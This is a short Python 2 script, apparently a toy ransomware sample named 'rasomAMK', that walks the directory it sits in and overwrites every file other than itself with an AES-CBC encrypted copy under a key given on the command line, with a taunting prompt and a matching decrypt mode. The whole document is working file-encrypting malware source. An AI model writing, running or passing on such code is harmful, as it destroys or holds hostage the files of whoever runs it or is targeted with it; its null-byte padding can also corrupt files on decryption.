#!/usr/bin/python
import os
import sys
import random
import struct
import getopt
from Crypto import Random
from Crypto.Cipher import AES

def write_file(file_name, data):
    f = open(file_name, "w")
    f.write(data)
    f.close()

def getAllFiles():
    dir_path = os.path.dirname(os.path.realpath(__file__))
    dirs = []
    for dirName, subdirList, fileList in os.walk(dir_path):
        for fname in fileList:
            if (fname != 'rasomAMK.py'):
                dirs.append(dirName + "/" + fname)
    return dirs

def pad(message):
    return message + b"\0" * (AES.block_size - len(message) % AES.block_size)
    
def encryption(key):
    files = getAllFiles()
    print files
    for file in files:
        file_content = None
        with open(file, 'rb') as fo:
            file_content = fo.read()
        message = pad(file_content)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        write_file(file, iv + cipher.encrypt(message))


def decrypt(key):
    files = getAllFiles()
    print files
    for file in files:
        file_content = None
        with open(file, 'r') as fo:
            file_content = fo.read()
        iv = file_content[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(file_content[AES.block_size:])
        write_file(file, plaintext.rstrip(b"\0"))

def get_args():
    try:
        opts, args = getopt.getopt(sys.argv[1:], '', ["key=", "decrypt"])
        return opts
    except getopt.GetoptError as err:
        sys.exit(err)
	
def main():
    key = ''
    options = get_args()
    is_decrypt = False
    for option, data in options:
        if option in ("--key"):
          key = data
        if option in ('--decrypt'):
          is_decrypt = True
    if not key:
      print 'The key is required. >:D: --key=something'
      return 0
    
    if not is_decrypt:
        encryption(key)
        return 0
    decrypt(key)

if __name__ == "__main__":
  main()    
	

